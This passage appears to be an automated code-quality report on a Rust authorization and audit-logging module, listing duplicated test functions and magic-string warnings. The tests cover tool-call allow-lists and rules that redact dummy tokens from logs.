    fn test_authorize_tool_unrestricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: None,
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        assert!(authorize_tool_call(&identity, "any_tool"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 146

**Code:**
```
    fn test_authorize_tool_unrestricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: None,
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        assert!(authorize_tool_call(&identity, "any_tool"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 160

**Code:**
```
    fn test_authorize_tool_restricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["read".to_string(), "list".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        assert!(authorize_tool_call(&identity, "read"));
        assert!(authorize_tool_call(&identity, "list"));
        assert!(!authorize_tool_call(&identity, "write"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 160

**Code:**
```
    fn test_authorize_tool_restricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["read".to_string(), "list".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        assert!(authorize_tool_call(&identity, "read"));
        assert!(authorize_tool_call(&identity, "list"));
        assert!(!authorize_tool_call(&identity, "write"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 160

**Code:**
```
    fn test_authorize_tool_restricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["read".to_string(), "list".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        assert!(authorize_tool_call(&identity, "read"));
        assert!(authorize_tool_call(&identity, "list"));
        assert!(!authorize_tool_call(&identity, "write"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 160

**Code:**
```
    fn test_authorize_tool_restricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["read".to_string(), "list".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        assert!(authorize_tool_call(&identity, "read"));
        assert!(authorize_tool_call(&identity, "list"));
        assert!(!authorize_tool_call(&identity, "write"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 176

**Code:**
```
    fn test_authorize_tool_wildcard() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["*".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        assert!(authorize_tool_call(&identity, "any_tool"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 176

**Code:**
```
    fn test_authorize_tool_wildcard() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["*".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        assert!(authorize_tool_call(&identity, "any_tool"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 176

**Code:**
```
    fn test_authorize_tool_wildcard() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["*".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        assert!(authorize_tool_call(&identity, "any_tool"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 190

**Code:**
```
    fn test_is_tools_list_request() {
        let request = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: Some("tools/list".to_string()),
            params: None,
            result: None,
            error: None,
        };
        assert!(is_tools_list_request(&request));

        let other_request = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: Some("tools/call".to_string()),
            params: None,
            result: None,
            error: None,
        };
        assert!(!is_tools_list_request(&other_request));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 190

**Code:**
```
    fn test_is_tools_list_request() {
        let request = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: Some("tools/list".to_string()),
            params: None,
            result: None,
            error: None,
        };
        assert!(is_tools_list_request(&request));

        let other_request = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: Some("tools/call".to_string()),
            params: None,
            result: None,
            error: None,
        };
        assert!(!is_tools_list_request(&other_request));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 190

**Code:**
```
    fn test_is_tools_list_request() {
        let request = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: Some("tools/list".to_string()),
            params: None,
            result: None,
            error: None,
        };
        assert!(is_tools_list_request(&request));

        let other_request = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: Some("tools/call".to_string()),
            params: None,
            result: None,
            error: None,
        };
        assert!(!is_tools_list_request(&other_request));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 214

**Code:**
```
    fn test_filter_tools_list_unrestricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: None,
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        let response = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: None,
            params: None,
            result: Some(serde_json::json!({
                "tools": [
                    {"name": "read_file", "description": "Read a file"},
                    {"name": "write_file", "description": "Write a file"}
                ]
            })),
            error: None,
        };

        let filtered = filter_tools_list_response(response, &identity);
        let result = filtered.result.unwrap();
        let tools = result["tools"].as_array().unwrap();
        assert_eq!(tools.len(), 2);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 214

**Code:**
```
    fn test_filter_tools_list_unrestricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: None,
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        let response = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: None,
            params: None,
            result: Some(serde_json::json!({
                "tools": [
                    {"name": "read_file", "description": "Read a file"},
                    {"name": "write_file", "description": "Write a file"}
                ]
            })),
            error: None,
        };

        let filtered = filter_tools_list_response(response, &identity);
        let result = filtered.result.unwrap();
        let tools = result["tools"].as_array().unwrap();
        assert_eq!(tools.len(), 2);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 245

**Code:**
```
    fn test_filter_tools_list_restricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["read_file".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        let response = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: None,
            params: None,
            result: Some(serde_json::json!({
                "tools": [
                    {"name": "read_file", "description": "Read a file"},
                    {"name": "write_file", "description": "Write a file"},
                    {"name": "delete_file", "description": "Delete a file"}
                ]
            })),
            error: None,
        };

        let filtered = filter_tools_list_response(response, &identity);
        let result = filtered.result.unwrap();
        let tools = result["tools"].as_array().unwrap();
        assert_eq!(tools.len(), 1);
        assert_eq!(tools[0]["name"], "read_file");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 346

**Code:**
```
    fn test_extract_tool_name() {
        let message = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: Some("tools/call".to_string()),
            params: Some(serde_json::json!({"name": "read_file", "arguments": {}})),
            result: None,
            error: None,
        };

        assert_eq!(extract_tool_name(&message), Some("read_file"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 346

**Code:**
```
    fn test_extract_tool_name() {
        let message = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: Some("tools/call".to_string()),
            params: Some(serde_json::json!({"name": "read_file", "arguments": {}})),
            result: None,
            error: None,
        };

        assert_eq!(extract_tool_name(&message), Some("read_file"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 360

**Code:**
```
    fn test_extract_tool_name_returns_none_for_non_tool_call() {
        let message = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: Some("resources/list".to_string()),
            params: None,
            result: None,
            error: None,
        };

        assert_eq!(extract_tool_name(&message), None);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 413

**Code:**
```
    fn test_authorize_request_denies_unauthorized_tool() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["read_file".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        let message = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: Some("tools/call".to_string()),
            params: Some(serde_json::json!({"name": "delete_file"})),
            result: None,
            error: None,
        };

        match authorize_request(&identity, &message) {
            AuthzDecision::Allow => panic!("Expected Deny"),
            AuthzDecision::Deny(reason) => {
                assert!(reason.contains("delete_file"));
            }
        }
    }
```

---

#### Magic value '"tools/call"' used in comparison operation (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 34

---

#### Magic value '"name"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 36

---

#### Magic value '"tools/list"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 75

---

#### Magic value '"tools"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 110

---

#### Magic value '"name"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 115

---

#### Magic value '"read"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 164

---

#### Magic value '"list"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 164

---

#### Magic value '"tools"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 229

---

#### Magic value '"name"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 230

---

#### Magic value '"read_file"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 230

---

#### Magic value '"description"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 230

---

#### Magic value '"name"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 231

---

#### Magic value '"write_file"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 231

---

#### Magic value '"description"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 231

---

#### Magic value '"read_file"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 249

---

#### Magic value '"tools"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 260

---

#### Magic value '"name"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 261

---

#### Magic value '"read_file"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 261

---

#### Magic value '"description"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 261

---

#### Magic value '"name"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 262

---

#### Magic value '"write_file"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 262

---

#### Magic value '"description"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 262

---

#### Magic value '"name"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 263

---

#### Magic value '"delete_file"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 263

---

#### Magic value '"description"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 263

---

#### Magic value '"tools"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 292

---

#### Magic value '"name"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 293

---

#### Magic value '"read_file"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 293

---

#### Magic value '"description"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 293

---

#### Magic value '"name"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 294

---

#### Magic value '"write_file"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 294

---

#### Magic value '"description"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 294

---

#### Magic value '"read_file"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 311

---

#### Magic value '"list_files"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 311

---

#### Magic value '"tools"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 322

---

#### Magic value '"name"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 323

---

#### Magic value '"read_file"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 323

---

#### Magic value '"description"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 323

---

#### Magic value '"name"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 324

---

#### Magic value '"write_file"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 324

---

#### Magic value '"description"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 324

---

#### Magic value '"name"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 325

---

#### Magic value '"list_files"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 325

---

#### Magic value '"description"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 325

---

#### Magic value '"name"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 351

---

#### Magic value '"read_file"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 351

---

#### Magic value '"arguments"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 351

---

#### Magic value '"name"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 401

---

#### Magic value '"any_tool"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 401

---

#### Magic value '"read_file"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 417

---

#### Magic value '"name"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 426

---

#### Magic value '"delete_file"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 426

---

#### Magic value '"read_file"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 444

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1031

**Code:**
```
    fn test_redaction_rules_bearer_token() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "bearer_tokens".to_string(),
                pattern: r"Bearer\s+[A-Za-z0-9\-_.]+".to_string(),
                replacement: "Bearer [REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.xyz";
        let output = rules.redact(input);
        assert!(!output.contains("eyJ"));
        assert!(output.contains("Bearer [REDACTED]"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1031

**Code:**
```
    fn test_redaction_rules_bearer_token() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "bearer_tokens".to_string(),
                pattern: r"Bearer\s+[A-Za-z0-9\-_.]+".to_string(),
                replacement: "Bearer [REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.xyz";
        let output = rules.redact(input);
        assert!(!output.contains("eyJ"));
        assert!(output.contains("Bearer [REDACTED]"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1031

**Code:**
```
    fn test_redaction_rules_bearer_token() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "bearer_tokens".to_string(),
                pattern: r"Bearer\s+[A-Za-z0-9\-_.]+".to_string(),
                replacement: "Bearer [REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.xyz";
        let output = rules.redact(input);
        assert!(!output.contains("eyJ"));
        assert!(output.contains("Bearer [REDACTED]"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1031

**Code:**
```
    fn test_redaction_rules_bearer_token() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "bearer_tokens".to_string(),
                pattern: r"Bearer\s+[A-Za-z0-9\-_.]+".to_string(),
                replacement: "Bearer [REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.xyz";
        let output = rules.redact(input);
        assert!(!output.contains("eyJ"));
        assert!(output.contains("Bearer [REDACTED]"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1031

**Code:**
```
    fn test_redaction_rules_bearer_token() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "bearer_tokens".to_string(),
                pattern: r"Bearer\s+[A-Za-z0-9\-_.]+".to_string(),
                replacement: "Bearer [REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.xyz";
        let output = rules.redact(input);
        assert!(!output.contains("eyJ"));
        assert!(output.contains("Bearer [REDACTED]"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1047

**Code:**
```
    fn test_redaction_rules_api_key() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "api_keys".to_string(),
                pattern: r"(?i)(api[_-]?key)[=:]\s*([a-zA-Z0-9_\-]{20,})".to_string(),
                replacement: "$1=[REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = "Config: api_key=sk-1234567890abcdefghij1234567890";
        let output = rules.redact(input);
        assert!(!output.contains("sk-1234567890"));
        assert!(output.contains("api_key=[REDACTED]"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1047

**Code:**
```
    fn test_redaction_rules_api_key() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "api_keys".to_string(),
                pattern: r"(?i)(api[_-]?key)[=:]\s*([a-zA-Z0-9_\-]{20,})".to_string(),
                replacement: "$1=[REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = "Config: api_key=sk-1234567890abcdefghij1234567890";
        let output = rules.redact(input);
        assert!(!output.contains("sk-1234567890"));
        assert!(output.contains("api_key=[REDACTED]"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1047

**Code:**
```
    fn test_redaction_rules_api_key() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "api_keys".to_string(),
                pattern: r"(?i)(api[_-]?key)[=:]\s*([a-zA-Z0-9_\-]{20,})".to_string(),
                replacement: "$1=[REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = "Config: api_key=sk-1234567890abcdefghij1234567890";
        let output = rules.redact(input);
        assert!(!output.contains("sk-1234567890"));
        assert!(output.contains("api_key=[REDACTED]"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1047

**Code:**
```
    fn test_redaction_rules_api_key() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "api_keys".to_string(),
                pattern: r"(?i)(api[_-]?key)[=:]\s*([a-zA-Z0-9_\-]{20,})".to_string(),
                replacement: "$1=[REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = "Config: api_key=sk-1234567890abcdefghij1234567890";
        let output = rules.redact(input);
        assert!(!output.contains("sk-1234567890"));
        assert!(output.contains("api_key=[REDACTED]"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1078

**Code:**
```
    fn test_redaction_rules_multiple_patterns() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "bearer".to_string(),
                pattern: r"Bearer\s+\S+".to_string(),
                replacement: "Bearer [REDACTED]".to_string(),
            },
            RedactionRule {
                name: "api_key".to_string(),
                pattern: r"api_key=\S+".to_string(),
                replacement: "api_key=[REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = "Auth: Bearer xyz123 and api_key=abc456";
        let output = rules.redact(input);
        assert!(!output.contains("xyz123"));
        assert!(!output.contains("abc456"));
        assert!(output.contains("Bearer [REDACTED]"));
        assert!(output.contains("api_key=[REDACTED]"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1078

**Code:**
```
    fn test_redaction_rules_multiple_patterns() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "bearer".to_string(),
                pattern: r"Bearer\s+\S+".to_string(),
                replacement: "Bearer [REDACTED]".to_string(),
            },
            RedactionRule {
                name: "api_key".to_string(),
                pattern: r"api_key=\S+".to_string(),
                replacement: "api_key=[REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = "Auth: Bearer xyz123 and api_key=abc456";
        let output = rules.redact(input);
        assert!(!output.contains("xyz123"));
        assert!(!output.contains("abc456"));
        assert!(output.contains("Bearer [REDACTED]"));
        assert!(output.contains("api_key=[REDACTED]"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1078

**Code:**
```
    fn test_redaction_rules_multiple_patterns() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "bearer".to_string(),
                pattern: r"Bearer\s+\S+".to_string(),
                replacement: "Bearer [REDACTED]".to_string(),
            },
            RedactionRule {
                name: "api_key".to_string(),
                pattern: r"api_key=\S+".to_string(),
                replacement: "api_key=[REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = "Auth: Bearer xyz123 and api_key=abc456";
        let output = rules.redact(input);
        assert!(!output.contains("xyz123"));
        assert!(!output.contains("abc456"));
        assert!(output.contains("Bearer [REDACTED]"));
        assert!(output.contains("api_key=[REDACTED]"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1101

**Code:**
```
    fn test_redaction_rules_invalid_regex() {
        let result = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "invalid".to_string(),
                pattern: "[invalid(regex".to_string(), // Invalid regex
                replacement: "[REDACTED]".to_string(),
            },
        ]);
        assert!(result.is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1297

**Code:**
```
    fn test_audit_entry_creation() {
        let entry = AuditEntry::new(EventType::AuthSuccess)
            .with_identity("user123")
            .with_success(true);

        assert_eq!(entry.identity_id, Some("user123".to_string()));
        assert!(entry.success);
        assert!(matches!(entry.event_type, EventType::AuthSuccess));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 99.2% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1297

**Code:**
```
    fn test_audit_entry_creation() {
        let entry = AuditEntry::new(EventType::AuthSuccess)
            .with_identity("user123")
            .with_success(true);

        assert_eq!(entry.identity_id, Some("user123".to_string()));
        assert!(entry.success);
        assert!(matches!(entry.event_type, EventType::AuthSuccess));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 99.0% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 859

**Code:**
```
    fn new(
        url: String,
        headers: HashMap<String, String>,
        batch_size: usize,
        flush_interval_secs: u64,
    ) -> Self {
        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(AUDIT_HTTP_TIMEOUT_SECS))
            .build()
            .unwrap_or_else(|e| {
                tracing::warn!(
                    error = %e,
                    "Failed to create HTTP client with custom config, using default"
                );
                reqwest::Client::new()
            });

        Self {
            url,
            headers,
            batch_size,
            flush_interval: Duration::from_secs(flush_interval_secs),
            client,
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.9% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 276

**Code:**
```
    fn compress_file(source: &PathBuf, dest: &PathBuf) -> io::Result<()> {
        let input = File::open(source)?;
        let output = File::create(dest)?;
        let mut encoder = GzEncoder::new(output, Compression::default());

        io::copy(&mut io::BufReader::new(input), &mut encoder)?;
        encoder.finish()?;

        Ok(())
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.8% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1078

**Code:**
```
    fn test_redaction_rules_multiple_patterns() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "bearer".to_string(),
                pattern: r"Bearer\s+\S+".to_string(),
                replacement: "Bearer [REDACTED]".to_string(),
            },
            RedactionRule {
                name: "api_key".to_string(),
                pattern: r"api_key=\S+".to_string(),
                replacement: "api_key=[REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = "Auth: Bearer xyz123 and api_key=abc456";
        let output = rules.redact(input);
        assert!(!output.contains("xyz123"));
        assert!(!output.contains("abc456"));
        assert!(output.contains("Bearer [REDACTED]"));
        assert!(output.contains("api_key=[REDACTED]"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.6% similarity.

